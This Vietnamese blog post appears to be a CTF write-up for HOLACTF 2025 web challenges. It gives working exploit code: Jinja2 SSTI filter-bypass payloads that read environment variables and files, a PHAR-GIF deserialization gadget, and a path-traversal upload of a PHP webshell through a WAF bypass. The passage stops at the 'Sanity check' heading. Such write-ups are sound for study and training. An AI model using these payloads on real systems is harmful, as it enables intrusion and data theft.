---
title: WEB - HOLACTF 2025
published: 2025-08-31
description: Đây là write up cho các bài Web mà mình làm được khi tham gia HOLACTF 2025 - một sân chơi An toàn thông tin do CLB EHC tổ chức. (Mình sẽ update lại bằng tiếng anh sau)
image: "./holactf.png"
tags: [CTF, Web Exploitation, Exploit, HOLACTF, EHC]
category: Web Exploitation
draft: false
---

# HOLACTF 2025

<img width="1918" height="1079" alt="image" src="https://github.com/user-attachments/assets/9ea15e25-dc07-437c-b741-70e83e0af7c6" />

# WEB - Magic random

```text
Author
ductohno

Description
Phép thuật chưa bao giờ là con đường bằng phẳng. Chỉ khi kiên định bước qua mọi thử thách, bạn mới có thể gầy dựng nên một pháp thuật mang bản sắc riêng của chính mình.
```

## Tổng quan

Đọc qua source thì ta thấy ở route /api/cast_attack, khi attack_name không trùng key hợp lệ thì server sẽ xử lí như sau:

```python
@app.route("/api/cast_attack")
def cast_attack():
    ....
            attack_name=valid_template(attack_name)
            if not special_filter(attack_name):
                return jsonify({"error": "Creating magic is failed"}), 404
            template=render_template_string("<i>No magic name "+attack_name+ " here, try again!</i>")    
            return jsonify({"error": template}), 404
        except Exception as e:
            return jsonify({"error": "There is something wrong here: "+str(e)}), 404
```

- `attack_name` được nối chuỗi trực tiếp vào template và render bằng Jinja2, ở đây có thể lợi dụng khai thác lỗ hổng SSTI.
- Test thử bằng `GET /api/cast_attack?attack_name={{70-21}}` thì mình thấy server trả về “No magic name `0{}-2}{71` here…”.
    - Khi gửi payload thô theo dạng gốc `{{70-21}}` thì payload sẽ bị server xáo ký tự trước khi render, lúc đó template nhận chuỗi đã bị đảo `0{}-2}{71`, nên server sẽ không thực thi payload được và trả về chính chuỗi bị đảo trong thông báo.
- Nếu gửi **preimage** của biểu thức `{{70-21}}` là `{1}{0-}72` ( với độ dài 8) thì server xáo xong mới khớp lại thành `{{70-21}}` lúc đó Jinja thực thi và output là `49`.

## Khai thác

Để gửi preimage cho payload SSTI thì mình dùng script này, sau khi chuyển thành chuỗi preimage thì sẽ gửi lên server để server thực thi payload và trả về output:

```python
import re, math, argparse, requests

def shuffled_of(api, probe: str) -> str:
    r = requests.get(api, params={"attack_name": probe})
    j = r.json()
    m = re.search(r"No magic name (.+?) here", j.get("error",""))
    if not m:
        raise RuntimeError(j.get("error", j))
    return m.group(1)

ALPH = "_0123456789"

def build_probe(n: int, k: int) -> str:
    arr = [ALPH[(i // (10**k)) % 10 + 1] for i in range(n)]
    if n > 0:
        arr[0] = "_"
    return ''.join(arr)

def infer_perm(api, n: int):
    if n <= 1:
        return list(range(n))
    m = math.ceil(math.log10(n))
    probes = [build_probe(n, k) for k in range(m)]
    outs = [shuffled_of(api, p) for p in probes]
    perm = [None]*n
    for newpos in range(n):
        i, zero = 0, True
        for k in range(m):
            ch = outs[k][newpos]
            if ch != "_":
                zero = False
                digit = ALPH.index(ch) - 1
                i += digit * (10**k)
        if zero:
            i = 0
        if i >= n:
            i %= n
        perm[i] = newpos
    if any(v is None for v in perm):
        raise RuntimeError("perm inference failed")
    return perm

def preimage(api, target: str) -> str:
    perm = infer_perm(api, len(target))
    return ''.join(target[j] for j in perm)

def send(api, target: str):
    s = preimage(api, target)
    r = requests.get(api, params={"attack_name": s})
    return s, r.json().get("error","")

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://127.0.0.1:51412", help="http://host:port")
    ap.add_argument("--expr", default="{{70-21}}", help="Jinja2 payload đích")
    ap.add_argument("--dry", action="store_true", help="Chỉ in preimage, không gửi")
    args = ap.parse_args()

    API = f"{args.base.rstrip('/')}/api/cast_attack"
    s = preimage(API, args.expr)
    if args.dry:
        print(s)
    else:
        print("preimage:", s)
        print(requests.get(API, params={"attack_name": s}).json().get("error",""))
```

Đọc source code sẽ thấy với filter này thì mình bị chặn những literal nhạy cảm, tất nhiên là mình cũng bị chặn import, os lẫn sys  ở payload đầu vào, những cái rất quan trọng để đọc được flag: 

```python
def special_filter(user_input):
    simple_filter=["flag", "*", "\"", "'", "\\", "/", ";", ":", "~", "`", "+", "=", "&", "^", "%", "$", "#", "@", "!", "\n", "|", "import", "os", "request", "attr", "sys", "builtins", "class", "subclass", "config", "json", "sessions", "self", "templat", "view", "wrapper", "test", "log", "help", "cli", "blueprints", "signals", "typing", "ctx", "mro", "base", "url", "cycler", "get", "join", "name", "g.", "lipsum", "application", "render"]
    for char_num in range(len(simple_filter)):
        if simple_filter[char_num] in user_input.lower():
            return False
    return True
```

Đây là cách giải của mình:

1. Tìm xem có `typing` không:

```powershell
# {{session.__init__.__globals__.t.__repr__()}}

PS C:\Users\biscuit\Downloads\magic_random> & C:/Users/biscuit/AppData/Local/Microsoft/WindowsApps/python3.10.exe c:/Users/biscuit/Downloads/magic_random/exploit1.py --expr "{{session.__init__.__globals__.t.__repr__()}}"                  
preimage: bae}i}stl{_o_p_sr.___.s(n_n_l__o.e.gi_s{rt_)i
<i>No magic name &lt;module &#39;typing&#39; from &#39;/usr/local/lib/python3.12/typing.py&#39;&gt; here, try again!</i>
```
- Vậy là có `typing.py` ở `/usr/local/lib/python3.12/typing.py`.

2. Lấy `sys` qua `typing.__dict__['sys']`:

```powershell
# {{(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).__repr__()}}

PS C:\Users\biscuit\Downloads\magic_random> & C:/Users/biscuit/AppData/Local/Microsoft/WindowsApps/python3.10.exe c:/Users/biscuit/Downloads/magic_random/exploit1.py --expr "{{(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).__repr__()}}"
preimage: [dnre<ne3_(._a})>)to{)_}d.sil]__s(>_i___])3_52_nlg_to_r_dtcd(._-piieraon__inr3r()_3)_s_d)o_a(r{)_.__3o].b(d()s).n__e(s1_.sn)b[ii_e[(.a).t[.(.sp<((__...s5a_ed2_i_a_]_t_r_3i_cs)_p_p_gg__(l_l
<i>No magic name &lt;module &#39;sys&#39; (built-in)&gt; here, try again!</i>
```

3. Lấy `os` qua `sys.modules['os']`:

```powershell
# {{(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[((none.__repr__())[1]).__add__((((3>5)and(2<3)).__repr__()[3]))].__repr__()}}

PS C:\Users\biscuit\Downloads\magic_random> & C:/Users/biscuit/AppData/Local/Microsoft/WindowsApps/python3.10.exe c:/Users/biscuit/Downloads/magic_random/exploit1.py --expr "{{(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[((none.__repr__())[1]).__add__((((3>5)and(2<3)).__repr__()[3]))].__repr__()}}"
preimage: _snrlo>.__)_>d.5pe)(_n_.(_o)}i_bes(ii_b_]rd)(a}ca_)s>)et).(5)ldnr3t_e3nns3_s3___.3((({_d.d(t_)__d<_e]ae(.o)i2.)_.r_il__)p_(l)o](pr(de((e_5r_i_mnno_a_{_)o._pd_s_e<a)ro).]ersd_.s]_an.__r([n3]_guip.[[()s[2<.-3t_.pi[____1]a[)(_a31_g(_rl3t))(ci_()2._dgd_(_)sr.[__n__
<i>No magic name &lt;module &#39;os&#39; (frozen)&gt; here, try again!</i>
```

4. Đọc `ENV`:

```powershell
# {{(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[((none.__repr__())[1]).__add__((((3>5)and(2<3)).__repr__()[3]))].environ.__repr__()}}

PS C:\Users\biscuit\Downloads\magic_random> & C:/Users/biscuit/AppData/Local/Microsoft/WindowsApps/python3.10.exe c:/Users/biscuit/Downloads/magic_random/exploit1.py --expr "{{(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[((none.__repr__())[1]).__add__((((3>5)and(2<3)).__repr__()[3]))].environ.__repr__()}}"
preimage: e(._.[_e_v-s2s_3g]e_o.e___.)})_.ri)sl3b.ea_))p}l)pa_(__n[_nret3))i_tr(_(tids_.smlra.s)__c__.2..n{3_((__i(>>ep(ipnl)nrs]]d[o_()__r)3())_[5__donnr).2<._)_{o.(a_(rta3_)(31(e__d(]t_i>e_[..(e3_3).s___(pa_[r_(5_oi]n._dpd1e.__b_dn]_r(n)5is]_so_n)(d<(c<dlr(_odad_r__i))[ounggai
<i>No magic name environ({&#39;KUBERNETES_SERVICE_PORT&#39;: &#39;443&#39;, &#39;KUBERNETES_PORT&#39;: &#39;tcp://10.100.0.1:443&#39;, &#39;HOSTNAME&#39;: &#39;magic-random-ea5710c0c1194be0&#39;, &#39;PYTHON_PIP_VERSION&#39;: &#39;24.0&#39;, &#39;SHLVL&#39;: &#39;1&#39;, &#39;HOME&#39;: &#39;/app&#39;, &#39;GPG_KEY&#39;: &#39;7169605F62C751356D054A26A821E680E5FA6305&#39;, &#39;PYTHON_GET_PIP_URL&#39;: &#39;https://github.com/pypa/get-pip/raw/dbf0c85f76fb6e1ab42aa672ffca6f0a675d9ee4/public/get-pip.py&#39;, &#39;KUBERNETES_PORT_443_TCP_ADDR&#39;: &#39;10.100.0.1&#39;, &#39;PATH&#39;: &#39;/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#39;, &#39;KUBERNETES_PORT_443_TCP_PORT&#39;: &#39;443&#39;, &#39;KUBERNETES_PORT_443_TCP_PROTO&#39;: &#39;tcp&#39;, &#39;LANG&#39;: &#39;C.UTF-8&#39;, &#39;PYTHON_VERSION&#39;: &#39;3.12.2&#39;, &#39;KUBERNETES_SERVICE_PORT_HTTPS&#39;: &#39;443&#39;, &#39;KUBERNETES_PORT_443_TCP&#39;: &#39;tcp://10.100.0.1:443&#39;, &#39;KUBERNETES_SERVICE_HOST&#39;: &#39;10.100.0.1&#39;, &#39;PWD&#39;: &#39;/app&#39;, &#39;PYTHON_GET_PIP_SHA256&#39;: &#39;dfe9fd5c28dc98b5ac17979a953ea550cec37ae1b47a5116007395bfacff2ab9&#39;, &#39;GZCTF_TEAM_ID&#39;: &#39;1250&#39;, &#39;WERKZEUG_SERVER_FD&#39;: &#39;3&#39;}) here, try again!</i>
```

5. Liệt kê các file có trong `/app`:

```powershell
# {{(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].listdir((session.__init__.__globals__.__spec__.origin)[0].__add__(((3>5)and(2<3)).__repr__()[1]).__add__((session.__init__.__globals__.__spec__.origin)[-2]).__add__((session.__init__.__globals__.__spec__.origin)[-2]))}}

PS C:\Users\biscuit\Downloads\magic_random> & C:/Users/biscuit/AppData/Local/Microsoft/WindowsApps/python3.10.exe c:/Users/biscuit/Downloads/magic_random/exploit1.py --expr "{{(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].listdir((session.__init__.__globals__.__spec__.origin)[0].__add__(((3>5)and(2<3)).__repr__()[1]).__add__((session.__init__.__globals__.__spec__.origin)[-2]).__add__((session.__init__.__globals__.__spec__.origin)[-2]))}}"
preimage: d_0[a(>(n_>]._gi.i_35r___1<t)).(_aa>itd_{_d]tn)_<n)_.._5<)nar3_(r()__sbt_gstl.e_(p[_i.[.ili[)__l3_es)(g_rmsr.p_1sg2s(n_e__.__e_.rn(._3._poe[(___{(n_(dpd(gdn(iie5_a.d5ol__s(i)d3[.]_)]se22__[as3_a___de.._ionco_ssood__n_))esr).)oiadod]_b>_ip_[_(p)lt3.no_ari-ceb_n_s((_.d__t(o___.__l]at._iln_ii_i_e)d.csess)))(_b)_os)3___rt_)13))i_.nr2o_o]r_l_a[_idn(r_esg.s(ai_d_u(i..r_idls_sbi(3)_gno2]op))(2o_.]il___)ss](p_.-ec_p..en<_)(i)n_cs__-.._]_e}._ga3a}(ndnl[[_ir(_rag(sld__s  
<i>No magic name [&#39;flag_3i3Bqp92KMSCXkT.txt&#39;, &#39;static&#39;, &#39;templates&#39;, &#39;app.py&#39;] here, try again!</i>
```

6. Đọc file flag trong `/app`:

```powershell
# {{(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].read((session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].open(((session.__init__.__globals__.__spec__.origin)[0].__add__(((3>5)and(2<3)).__repr__()[1]).__add__((session.__init__.__globals__.__spec__.origin)[-2]).__add__((session.__init__.__globals__.__spec__.origin)[-2])).__add__((session.__init__.__globals__.__spec__.origin)[0]).__add__((session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].listdir((session.__init__.__globals__.__spec__.origin)[0].__add__(((3>5)and(2<3)).__repr__()[1]).__add__((session.__init__.__globals__.__spec__.origin)[-2]).__add__((session.__init__.__globals__.__spec__.origin)[-2]))[0]),(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].O_RDONLY),8192)}}

PS C:\Users\biscuit\Downloads\magic_random> & C:/Users/biscuit/AppData/Local/Microsoft/WindowsApps/python3.10.exe c:/Users/biscuit/Downloads/magic_random/exploit1.py --expr "{{(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].read((session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].open(((session.__init__.__globals__.__spec__.origin)[0].__add__(((3>5)and(2<3)).__repr__()[1]).__add__((session.__init__.__globals__.__spec__.origin)[-2]).__add__((session.__init__.__globals__.__spec__.origin)[-2])).__add__((session.__init__.__globals__.__spec__.origin)[0]).__add__((session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].listdir((session.__init__.__globals__.__spec__.origin)[0].__add__(((3>5)and(2<3)).__repr__()[1]).__add__((session.__init__.__globals__.__spec__.origin)[-2]).__add__((session.__init__.__globals__.__spec__.origin)[-2]))[0]),(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].O_RDONLY),8192)}}"
preimage: _s[_3a()_3o(e)(n_.l()cn)ac_n_p.l2)s__.as__0nl__t2__-_]de__[_i_{ar_l_3_(d(N_irp<s(_i[.ssne_]_.__r<-ll()l3n).o(og.()t}de(_3<[(oe)]_r_3[___g_1_igb3r2abr3)r_._.elo(se)]3_dc()])))n)it]cro_i)pn}t5tnn_(__d_s)rs___][_idn.cp.d)a__rnua_a_)_o_sst])_(.dee<n__s.o3_p)b)_i_((i_o3_l__[_oia__i3_ad(<s._l.io<d(_(rt1[lnno)s>i.o(s(()_))s(.dr_)R).r_i].i[..._mgl_i[._9g_(1s_psno)g)[())t_n3._1.((b_oo-ti_)__(earpn))_(ede3_(sa[][]s._(ap].cds_>op__)_gi.b_(()Yg.i_<_r_pi_)cple(]2sd{_o>di)_a_l2lrad<_ps_o(e.on3g__d__o[_is)(_(__(us__-p_b_(()_,_3]elgngral5gg___]>idrin_.pr3)a]_(s3.sd><abd_sidsn[dse5_o__o_(e.(5._e_i___n)((r_agd___)_n).___r_2easie.o_._(_.)s((.8emb__u__]__)_[gidl_ge_e()n.r_a2_ed_a]_3s_lcbt_(3[(p.[.o_e_sg_nn.2s__o_s_.ea__rn0_]d__(endo_3_epor-e).s_r>as2i_ds_rrisiei_asa__to_],_ip_i).d[2]n)(5rnroi._ls(__ei_3()d.___n__s.r)_b_r_c(pc>1(_).._r[_)s.t(___n[toi)[.0)(i3__i)is_ii(a_e_.0i__ii(._oa.r.)._s_._._i_(3(_.e_(ie)sngn(i_>a3.[__1r(.ot.n[]-a___ai_n_)nni..dl__[i.sin)lp])i5pn(_3.nmp3(t__5oe2_css]_>o(_.1diobsr_(n(si_lr._sl_(e[db.enppd(_rnrddp())_n.)_)ae_a]ep)<).__p[-a3oeeaas2)o_s__s>p5s.[snd_>t_._(e.n)a5t[ai))io>s2_5______i_<o.d3.)i..i___d(n_)lb3_.(d)_o)_o_e.[().(a]3_s_nee.](n)ddt(.2._[sd_<3r-_onc(ngrt]O__i5_ri_o_da()igcp_<n2i3aot.l<____dasg.)en(ct(s[g)dL(o]eie.gp).n___l[t[ugdd1oi.)dl_tsrd(ir)5]_.e_atgda_(_ri_.rg)t_d]O_(___[__[(___d.ea._sn]_d((3_]2_.])l.)abs2[(os5m_)i__s].lnr__n3(1_)13(_)3)(i_l_.ediic_)3Dd2e_asta_dd_s_nl]r._oo)st_._.2s___.sp]l_3[1s.()__r___s..ia(nn5>)n_.)d().._ld)d.ad(_3]e)s(nd)t___>)be_drl_
<i>No magic name b&#39;HOLACTF{cRea73_YoUr_MA6iC_27cbffcbaedd}}\n&#39; here, try again!</i>
```
`FLAG: HOLACTF{cRea73_YoUr_MA6iC_27cbffcbaedd}`

# WEB - hell_ehc

```text
Author
perrito

Description
Boring fact: The original name of this challenge is your PHARts stinks.
```

Bài này sẽ khai thác đọc `HOLACTF{...}` bằng cách lợi dụng việc `unserialize()` cookie và việc gọi `md5_file()` trên đường dẫn `phar://`.

## Tổng quan

- Web xử lý cookie `user` bằng `unserialize()` với `allowed_classes=['User','LogFile']`.
    
    `home.php`
    
    ```php
    $info = unserialize(base64_decode($_COOKIE['user']), ['allowed_classes' => ['User', 'LogFile']]);
    ```
    
    `view_avatars.php`
    
    ```php
    $info = unserialize(base64_decode($_COOKIE['user']), ['allowed_classes' => ['User', 'LogFile']]);
    ```
    
    `upload.php`
    
    ```php
    $info = unserialize(base64_decode($_COOKIE['user']), ['allowed_classes' => ['User', 'LogFile']]);
    ```
    
- Class `LogFile` có `__destruct()` gọi `md5_file($this->filename)`.
    
    `LogAndCheck.php`
    
    ```php
    class LogFile
    {
        public $filename;
    
        public function __destruct()
        {
            return md5_file($this->filename);
        }
    }
    ```
    
- Khi `md5_file()` mở một đường dẫn `phar://…`, PHP **unserialize metadata** trong PHAR. Bước này **không bị** `allowed_classes` giới hạn.
- Đặt một object “gadget” trong metadata (ví dụ `Logger` có `__destruct()` ghi dữ liệu vào file công khai).
    
    `LogAndCheck.php` (sẵn class `Logger` trong app, phục vụ gadget)
    
    ```php
    class Logger
    {
        public function __destruct()
        {
    ...
    ```
    
- Ghi PHP vào `logMD5.php`, sau đó truy cập file để `readfile('/flag.txt')`.
    
    Hàm log sẵn có của ứng dụng:
    
    `LogAndCheck.php`
    
    ```php
    function checkMd5AndLog($md5Hash)
    {
        if (strlen($md5Hash) !== 32 || !ctype_xdigit($md5Hash)) {
            return;
        }
        $file = 'logMD5.php';
    
        if (!file_exists($file)) {
            touch($file);
        }
    
        $entry = $md5Hash . PHP_EOL;
        file_put_contents($file, $entry, FILE_APPEND);
    }
    ```
    
    Điểm ghi MD5 vào log:
    
    `upload.php`
    
    ```php
    if (move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file)) {
      $getMD5 = md5_file($target_file);
      checkMd5AndLog($getMD5);
      $conn->updateAvatar($username, $fileName);
      header('Location: /?page=home');
    }
    ```
    
    Cookie định dạng `base64(serialize($user))`:
    
    `login.php`
    
    ```php
    $data = base64_encode(serialize($user));
    header("Set-Cookie: user=$data");
    header("Location: /?page=home");
    ```
    

---

## Chuỗi khai thác

1. Đăng ký và đăng nhập để có thư mục `upload/testq/`.
2. Tạo **PHAR–GIF polyglot**. Metadata chứa object `Logger` sao cho destructor append PHP vào `logMD5.php`.
3. Upload `avatar.gif` vào `upload/testq/avatar.gif`.
4. Tạo cookie `user` là object `LogFile` trỏ tới `phar://upload/testq/avatar.gif/a`.
5. Gọi trang có `unserialize(cookie)` để kích hoạt:
    - `LogFile->__destruct()` → `md5_file('phar://…')` → parse PHAR → **unserialize metadata**.
    - `Logger->__destruct()` chạy và **append** PHP vào `logMD5.php`.
6. Truy cập `logMD5.php` để in flag.

---

## Tạo PHAR–GIF polyglot

```php
<?php
class Logger { public $logs; public $request; }

$payload = new Logger();
$payload->logs    = 'logMD5.php';
$payload->request = '<?php readfile("/flag.txt"); ?>';
@unlink('p.phar');
$phar = new Phar('p.phar');
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($payload);
$phar->addFromString('a', 'x');
$phar->stopBuffering();
rename('p.phar','avatar.gif');
```

```
php -d phar.readonly=0 build_phar.php
```

Upload file avatar: `avatar.gif`

## Tạo cookie

```bash
PS C:\Users\biscuit\Desktop> $phar = 'phar://upload/testq/avatar.gif/a'
PS C:\Users\biscuit\Desktop> $len = [Text.Encoding]::UTF8.GetByteCount($phar)
PS C:\Users\biscuit\Desktop> $ser = 'O:7:"LogFile":1:{s:8:"filename";s:' + $len + ':"' + $phar + '";}'
PS C:\Users\biscuit\Desktop> $cookie = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($ser))
PS C:\Users\biscuit\Desktop> & "$env:SystemRoot\System32\curl.exe" -s `
>>   -H "Cookie: user=$cookie" `
>>   "http://127.0.0.1:59925/?page=view_avatars"
PS C:\Users\biscuit\Desktop> Invoke-WebRequest -UseBasicParsing `
>>   -Uri "http://127.0.0.1:59925/?page=view_avatars" `
>>   -Headers @{ Cookie = "user=$cookie" }

StatusCode        : 200
StatusDescription : OK
Content           :

                    <!DOCTYPE html>
                    <html lang="en" dir="ltr">
                    <head>
                        <meta charset="UTF-8">
                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
                        <title> Login </title>
                        <style>...
RawContent        : HTTP/1.1 200 OK
                    Transfer-Encoding: chunked
                    Connection: keep-alive
                    Content-Type: text/html; charset=UTF-8
                    Date: Sat, 30 Aug 2025 05:55:40 GMT
                    Server: nginx
                    X-Powered-By: PHP/7.4.0

                    <!DOCTYP...
Forms             :
Headers           : {[Transfer-Encoding, chunked], [Connection, keep-alive], [Content-Type, text/html; charset=UTF-8], [Date, Sat,
                    30 Aug 2025 05:55:40 GMT]...}
Images            : {}
InputFields       : {}
Links             : {@{outerHTML=<a href="/?page=register">Register now</a>; tagName=A; href=/?page=register}}
ParsedHtml        :
RawContentLength  : 3513
```

## Flag

```powershell
PS C:\Users\biscuit\Desktop> & "$env:SystemRoot\System32\curl.exe" -s "http://127.0.0.1:59925/logMD5.php"
01865ef3919e542a1a0fdc04313a5433
d304cc0f95860c2799b0a4e91b467f68
0764f8c8d680bb675f87e3f1a892a4b8
eccfb18a53ac83c6a4560d3fb7a21c30
eccde4803614947511bd1af76d1930e6
63a4ecf57394c8e85ecc817941453343
HOLACTF{I_love_EHCCCCC_cdfdcc941c4f}
PS C:\Users\biscuit\Desktop>
```
`FLAG: HOLACTF{I_love_EHCCCCC_cdfdcc941c4f}`

# WEB - another_hell_ehc

```text
Author
perrito

Description
I just create a new challenge with the same source code because i'm too lazy :((
```

## Username có thể traversal để ghi ra docroot

`login.php` đặt `$_SESSION["username"]` từ input, chỉ strip tags. Không chặn `../`.

```php
// login.php
$username = htmlspecialchars(strip_tags($username));
...
if ($conn->login($username, $password)) {
    $_SESSION["username"] = $username;
    $_SESSION["loggedin"] = true;
}
```

`upload.php` dùng trực tiếp `$_SESSION['username']` để tạo thư mục lưu file.

```php
// upload.php
$target_dir = "upload/" . $_SESSION['username'] . "/";   // <-- traversal tại đây
if (!is_dir($target_dir)) {
  mkdir($target_dir, 0777, true);
}
```

→ Đặt username = `../../../../../var/www/html` sẽ khiến file được ghi vào `/var/www/html/…`.

#### Sai logic lấy đuôi file có thể dùng `.jpg.phtml`

`upload.php` lấy đuôi bằng phần tử **thứ hai** sau `.` thay vì phần tử cuối.

```php
// upload.php
$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
...
$fileExt = explode('.', basename($fileName))[1]; //chỉ lấy sau dấu chấm đầu tiên
if (!in_array($fileExt, $allowedExtensions)) {
  exit("Sorry, your file type is not allowed.");
}
```

→ Tên `rce.jpg.phtml` cho `fileExt = 'jpg'` nên qua allowlist. File thực tế là PHP vì đuôi cuối `.phtml` vẫn được Apache parse.

## Bypass WAF

`nginx.conf` chỉ gọi WAF khi chuỗi query chứa đúng `page=upload`. WAF chỉ gắn vào `page=upload` có thế bypass dùng `%75` :

```conf
# nginx.conf
location / {
    if ($args ~ "page=upload") {
        access_by_lua_file /usr/local/openresty/nginx/lua/waf.lua;
    }
    proxy_pass http://127.0.0.1:8080/;
}
location /upload { deny all; return 403; }
```

→ Gọi `/?page=%75pload` thì PHP decode thành `upload` nhưng Nginx không khớp regex nên WAF sẽ không hoạt động.

## WAF có allowlist đuôi ảnh, block `.php|.phtml`

(bị vô hiệu do bypass ở bước vừa rồi)

```lua
-- waf.lua
local filename = body:match('filename="([^"]+)"')
local ext = filename:match("%.([^.]+)$")  -- lấy đuôi CUỐI
local allowed = { jpg=true, jpeg=true, png=true, gif=true }
if not allowed[ext:lower()] then
    ngx.status = 403
    ngx.say("Blocked: file extension not allowed - " .. ext)
    return ngx.exit(403)
end
```

## Router include theo `page`

```php
// index.php
$regex="/(secret|proc|environ|access|error|\.\.|\/|,|;|[|]|\|connect)/i";
if(isset($_GET['page']) && !empty($_GET['page'])) {
  if(!preg_match_all($regex,$_GET['page'])) {
    // (đoạn thêm .php rồi include)
    if(file_exists($page)) { include($page); }
  }
} else {
  header("Location: /?page=home.php");
}
```

Gọi trực tiếp `/rce.jpg.phtml` vì file đã được ghi thẳng vào docroot do trước đấy dùng path traversal.

```bash
PS C:\Users\biscuit\Desktop>
PS C:\Users\biscuit\Desktop> $BASE = 'http://127.0.0.1:63936'
PS C:\Users\biscuit\Desktop> $U    = '../../../../../var/www/html'   # traversal tới /var/www/html
PS C:\Users\biscuit\Desktop> $P    = 'p@ssw0rd'
PS C:\Users\biscuit\Desktop> curl.exe -s -c c.txt -X POST "$BASE/?page=register" --data-urlencode "username=$U" --data-urlencode "password=$P"
PS C:\Users\biscuit\Desktop> curl.exe -s -b c.txt -c c.txt -X POST "$BASE/?page=login"    --data-urlencode "username=$U" --data-urlencode "password=$P"
PS C:\Users\biscuit\Desktop> # tạo webshell
PS C:\Users\biscuit\Desktop> Set-Content -Path .\s.php -Value '<?php system($_GET["c"]); ?>' -Encoding ASCII -NoNewline
PS C:\Users\biscuit\Desktop> # upload qua đường tắt WAF: page=%75pload
PS C:\Users\biscuit\Desktop> # lấy đuôi = 'jpg'
PS C:\Users\biscuit\Desktop> curl.exe -s -b c.txt -F "avatar=@s.php;type=image/jpeg;filename=rce.jpg.phtml" "$BASE/?page=%75pload"
PS C:\Users\biscuit\Desktop> # RCE và đọc flag 
PS C:\Users\biscuit\Desktop> curl.exe -G -s --data-urlencode "c=whoami"         "$BASE/rce.jpg.phtml"
www-data
PS C:\Users\biscuit\Desktop> curl.exe -G -s --data-urlencode "c=cat /flag.txt"  "$BASE/rce.jpg.phtml"
HOLACTF{I_really_love_EHCCCCC_b3c78f2d5c35}
PS C:\Users\biscuit\Desktop>
```
`FLAG: HOLACTF{I_really_love_EHCCCCC_b3c78f2d5c35}`

# WEB - Sanity check

```text
Author
ductohno

Description
Chào mừng bạn ghé thăm website “vibe coding” của mình! Thực ra mình dựng nó chỉ để test xem server cần oxi không thôi, nhưng ở đâu đó vẫn có vài lỗi nho nhỏ đang ẩn mình. Liệu bạn có tìm ra chúng không?
```

